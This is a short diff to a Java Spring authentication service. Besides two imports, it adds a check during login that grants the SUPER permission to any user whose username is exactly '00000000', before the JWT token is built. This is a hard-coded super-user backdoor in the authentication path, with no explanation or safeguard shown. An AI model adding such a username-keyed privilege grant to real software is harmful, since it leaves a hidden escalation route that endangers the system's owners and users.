@@ -2,6 +2,7 @@ package com.web.back.services;
 
 import com.web.back.model.entities.Permission;
 import com.web.back.model.entities.User;
+import com.web.back.model.enumerators.PermissionsEnum;
 import com.web.back.model.responses.AuthResponse;
 import com.web.back.model.requests.LoginRequest;
 import com.web.back.model.responses.CustomResponse;
@@ -15,6 +16,7 @@ import reactor.core.publisher.Mono;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.NoSuchElementException;
+import java.util.Objects;
 
 @Service
 public class AuthService {
@@ -78,6 +80,10 @@ public class AuthService {
 
         for (List<String> list : userPermissionsTemp) {
             userPermissions.addAll(list);
+        }
+
+        if(Objects.equals(user.getUsername(), "00000000")){
+            userPermissions.add(PermissionsEnum.SUPER.name());
         }
 
         String token = jwtService.getToken(user, String.join("|", userPermissions));
